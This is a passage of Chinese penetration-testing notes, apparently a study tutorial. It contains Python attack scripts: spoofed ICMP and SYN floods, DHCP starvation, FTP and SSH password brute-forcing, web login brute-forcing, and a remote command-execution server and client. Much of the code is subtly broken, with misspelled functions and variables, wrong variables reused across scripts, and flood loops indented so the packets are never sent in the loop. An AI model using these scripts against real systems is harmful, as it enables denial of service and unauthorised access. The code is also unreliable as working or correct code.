from scapy.all import sendp,IP,ICMP
if len(sys.argv) < 2:
    print sys.argv[0] + "<spoofed_source_ip> <target>"
    sys.exit(0)
    while (1):
        pdst="%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
        psrc="1.1.1.1"
    sendp(IP(src=psrc,dst=pdst)/ICMP())
```

#### 传输层DOS

```python
TCP的DOS，出发点即是三次握手机制
和目标端口完成三次握手
只和目标端口完成前两次握手(SYN拒绝服务攻击)
```

```python
import sys,random
from scapy.all import senp,IP,TCP
if len(sys.argv) < 2:
    print "SynFlood.py + target IP"
    sys.exit(0)
while 1:
    psrc="%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
    pdst=argv[1]
sendp(IP(src=psrc,dst=pdst) / TCp(dport=80,flag="S"))
```

#### 应用层DOS

```python
DHCP：集中地管理、分配IP地址，使网络环境中的主机动态获取IP地址，Gateway地址、DNS服务器地址等信息，并提高地址的使用率

客户端广播DHCP Discover信息
服务器提供地址租约Offer
客户端选择并请求Request
服务器确认ACK

伪造大量DHVP请求报文到服务器使得DHCP服务器地址池中的IP地址被分配完毕，导致合法用户无法申请到IP地址
同时大量的DHCP请求也会导致服务器高负荷运行，导致设备瘫痪
```

```python
from scapy.all import srp,IP,UDP,Ether,DHCP,BOOTP
dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0",dst="255.255.255.255") / UDP(sport=68,dport=67) / BOOTP() / DHCP(options=[("message-type","discover"),"end"])
srp(dhcp_discover)
```

```python
Yersinia
Metasploit
```

# 身份认证攻击

#### 字典

```python
纯字典攻击：单纯依靠字典，利用工具将用户名和字典中的密码组合，一个一个试
混合攻击：此时需要破解的密码具有一定的强壮度，混合攻击依靠一定的算法对字典中的内容进行处理后再使用
完全暴力攻击：实际上，不需要字典，只利用工具将密码穷举出来
```

```python
#python生成字典
#itertools库
#count():产生递增的序列；count(1,5)生成从1开始的循环器，递增5，即1，6，11，16···
#cycle():重复序列中的元素；cycle('hello')即h,e,l,l,o,h,e,l,l,o,h···
#repeat():重复元素，构成无穷循环器；repeat(1)即1，1，1，1，1···
#product():获得多个循环器的笛卡尔积；product('xyz',[0,1])即x0,y0,z0,x1,y1,z1
#permutations('abcd',2):从abcd中挑选两个元素，例如ab,bc,将所有结果排序，返回为新的循环器，且这些组合是有顺序的，即c和d能生成cd和dc
#combinations('abcd',2):从abcd中挑选两个元素，例如ab,bc,将所有结果排序，返回为新的循环器，且这些组合是无序的，即c和d只能生成cd

import itertools
words = "1234567890abcdefghijklmnopqrstuvwxyz"
temp = itertools.permutations(words,2)
passwords = open("dic.txt","a")
for i in temp:
    passwords.write("".join(i))
    passwords.write("".join("\n"))
dic.close()
**************************************************************
#若已经获悉目标的密码为几个特定的字符
import sys
if len(sys.argv) !=3:
    print("input : <The char of pass> <The length of pass>")
    sys.exit(1)
word = sys.argv[1]
n = sys.argv[2]
temp = itertools.permutations(words,n)
pass = open("dic.txt","a")
for i in temp:
    pass.write("".join(i))
    pass.write("".join("\n"))
dic.close()
```

#### FTP爆破

```python
#FTP有个匿名登录机制，用户名anonymous,密码随意
#当然，这里的爆破是针对设置了用户名和密码的FTP
#ftplib模块
#ftp.connect("IP","port")，连接FTP服务和端口
#ftp.login("user","password")，连接的用户名、密码
#ftp.retrlines(command[,callback])，使用文本传输模式返回在服务器上执行命令的结果
**************************************************************
#使用指定用户名和密码登录FTP的python程序
def Login(FTPServer,UserName,PassWord):
    try:
        f = ftplib.FTP(FTPServer)
        f.connect(FTPServer,21,timeout=10)
        f.login(UserName,PassWord)
        #LIST是FTP本身的命令，这里用于展示FTP中的文件
        f.retrlines('LIST')
        f.quit()
        print("Get the Right PassWord")
    except ftplib.all_errors:
        pass
**************************************************************
#未知用户名和密码的FTP爆破
import ftplib
import sys
if len(sys.argv) != 4:
    print("FTPBtute.py <FTPServer> <UserDic> <PasswordDic>")
    sys.exit(1)
FTPServer = sys.argv[1]
UserDic = sys.argv[2]
PasswordDic = sys.argv[3]
def Login(FTPServer,UserName,PassWord):
    try:
        f = ftplib.FTP(FTPServer)
        f.connect(FTPServer,21,timeout=10)
        f.login(UserName,PassWord)
        f.quit()
        print("The UserName is %s and PassWord is %s " % (UserName,PassWord))
    except ftplib.all_errors:
        pass
UserNameFile = open(UserDic,"r")
PassWordFile = open(PasswordDic,"r")
for user in UseNameFile.readlines():
    for passwd in PassWordFile.readlines():
        un = user.strip('\n')
        pw = passwd.strip('\n')
        Login(FTPServer, un, pw)
```

#### SSH爆破

```python
SSH即Secure Shell,建立在应用层基础上的安全协议
目前用于远程管理的协议(Telnet协议也能远程管理，但Telnet是明文传输)
SSH中的数据是加密的
```

```python
#pxssh库
#connect(host,ser,password),建立SSH连接
#send_command(s,cmd),发送命令
#logout(),释放连接
#prompt(),等待提示符，通常用于等待命令执行结束

import sys
from pexpect import pxssh
if len(sys.argv) != 4:
    print("SSHBtute.py <SSHServer> <UserDic> <PasswordDic>")
    sys.exit(1)
SSHServer = sys.argv[1]
UserDic = sys.argv[2]
PasswordDic = sys.argv[3]
def Login(SSHServer,UserName,PassWord):
    try:
        s = pxssh.pxssh()
        s.login(SSHServer,UserName,PassWord)
        f.quit()
        print("The UserName is %s and PassWord is %s " % (UserName,PassWord))
    except:
        print '[-]Error Connecting'
UserNameFile = open(UserDic,"r")
PassWordFile = open(PasswordDic,"r")
for user in UseNameFile.readlines():
    for passwd in PassWordFile.readlines():
        un = user.strip('\n')
        pw = passwd.strip('\n')
        Login(FTPServer, un, pw)
```

#### Web爆破

```python
#对Web页面的用户名和密码进行爆破
#抓包获取在登录过程中提交的数据
#requests   urllib
import requests
#get读取
r = requests.get('http:192.168.92.2')
#payload根据抓包的结果进行填写
payload={"","","",""}
#post提交
resp=requests.post("http:",payload)
```

```python
Burp Suite
```

# 远程控制程序&工具

```python
远程控制程序=被控端+主控端
主控端；发送控制命令和接收执行结果
被控端：接收并执行控制命令
·被控端与主控端的连接方式是正向亦或是反向
    正向：被控端执行远程控制服务端并打开端口，等待主控端的连接，此时被控端不会主动通知主控端，因此需要知道被控端的IP
    反向：被控端会去通知主控端，无需知道被控端的IP，直接发送即可
    故，正向控制实际不容易实现
·按照操作系统来对远程控制工具分类，比如windows的exe，Android的apk
```

#### subprocess模块

```python
subprocess模块，执行控制命令
**************************************************************
若子进程不需要进行交互操作，则可使用subprocess.call
subprocess.call(args,*,stdin=None,stdout=None,stderr=None,shell=False)
args可以是一个字符串，也可以是一个包含程序参数的列表，用以指明需要执行的命令,args即可在python中执行对应命令
stdin,程序的标准输入
stdout,输出
stderr,错误句柄
stdin.stdout.stderr可以是PIPE，文件描述符，文件对象，默认值为None,表示从父进程继承
shell=True则导致subprocess.call接收字符串的变量作为命令，并调用shell去执行该字符串
shell=False则只接受数组变量作为命令，并将数组的第一个元素作为命令，其余均作为该命令的参数

import subprocess
child=subprocess.call("notepad.exe")
print child
**************************************************************
subprocess.check_call()
该函数的作用与subprocess.call几乎相同
不同在于subprocess.check_call会对返回值进行检查。若返回值非0，则抛出CalledProcessError异常。该异常有一个returncoed属性，记录子进程的返回值，可用try except检查
使用subprocess.check_call来对目标执行ping(两行函数效果相同)
child=subprocess.check_call(["ping","www.baidu.com"])
child=subprocess.check_call("ping www.baidu.com",shell=True)
print child
**************************************************************
subprocess.check_output()
会返回子进程向标准输出的输出结果，用于需要进行互动的时候
检查退出信息，如果returncode不为0，则抛出错误subprocess.CalledProcessError
output属性为标准输出的输出结果，可用try except检查
child=subprocess.check_output("ping www.baidu.com",shell=True)
print child
**************************************************************
subprocess.Popen
总的来说，其实subprocess.call()、subprocess.check_call()、subprocess.check_output()都是基于Popen的封装
# args可以是一个字符串，也可以是一个包含程序参数的列表
# 要执行的程序一般是这个列表的第一项或者字符串本身
class Popen(args,bufsize=0,executable=None,stdin=None,stdout=None,stderr=None,preexec_fn=None,close_fds=False,ced=None,env=None,universal_newlines=False,startupionfo=None,creationflags=0)

Popen对象创建后，主程序会不自动等待子进程完成
如果需要等待子进程，则需要使用wait()
```

```python
#subprocess模块编写一个执行指令命令的函数
def run_command(command):
    # rstrip()用来删除string字符串末尾的指定字符，默认为空格
    command=commmand.rstrip()
    try:
        child = subprocess.check_output(command,shell=True)
    except:
        child =  "can not execute the command \r\n"
    return child
#例如  目标执行的命令为显示C盘下的内容
execute = "dir c:"
output = =sun_command(execute)
print output
```

#### 客户端向服务端发送控制命令

```python
#实现的结果：服务端可以接受来自客户端的输入
#客户端
import socket
str_msg=input("输入要发送的信息：")
s2 = socket.socket()
s2.connect(("127.0.0.1",2345))
s2.send(str_msg)
print str(s2.recv(1024))
s2.close()
#服务端
import subprocess
import socket
def run_command(command):
    # rstrip()用来删除string字符串末尾的指定字符，默认为空格
    command=commmand.rstrip()
    print command
    try:
        child = subprocess.check_output(command,shell=True)
        print child
    except:
        child =  "can not execute the command \r\n"
    return child
s1 = socket.socket()
s1.bind(("127.0.0.1",2345))
s1.listen(5)
while 1:
    conn,address = s1.accept()
    print("a new connect from ",address)
    conn.send("Hello")
    data=conn.recv(1024)
    print("The command is " + data)
    output = run_command(data)
    conn.send(output)
conn.close()
```

```python
#实现的结果：服务端可以接受来自客户端的输入
# 命令行的控制方式
#客户端
import socket
s2 = socket.socket()
s2.connect(("127.0.0.1",2346))
while 1:
    #现在等待数据回传
    recv_len = 1
    response = ''
    while revc_len:
        data = s2.recv(4096)
        recv_len = len(data)
        response += data
        if recv_len < 4096:
            break
    print(response, )
    #等待更多输入
    buffer = raw_input("")
    buffer += '\n\n'
    #发出去
    s2.send(buffer)

#服务端
import subprocess
import socket
def run_command(command):
    # rstrip()用来删除string字符串末尾的指定字符，默认为空格
    command=commmand.rstrip()
    print command
    try:
        child = subprocess.check_output(command,shell=True)
        print child
    except:
        child =  "can not execute the command \r\n"
    return child
s1 = socket.socket()
s1.bind(("127.0.0.1",2346))
s1.listen(5)
while 1:
    conn,address = s1.accept()
    print("a new connect from ",address)
    conn.send("Hello")
    data=conn.recv(1024)
    print("The command is " + data)
    while 1:
        #跳出一个窗口
        conn.send('<xy.#>')
        #接收文件知道发现换行符
        cmd_buffer = ''
        while '\n' not in cmd+buffer:
            cmd_buffer += conn.recv(1024)
            #返还命令输出
            response = run_command(cmd_buffer)
            #返回响应数据
            conn.send(response)
conn.close()
```

# 无线网络渗透



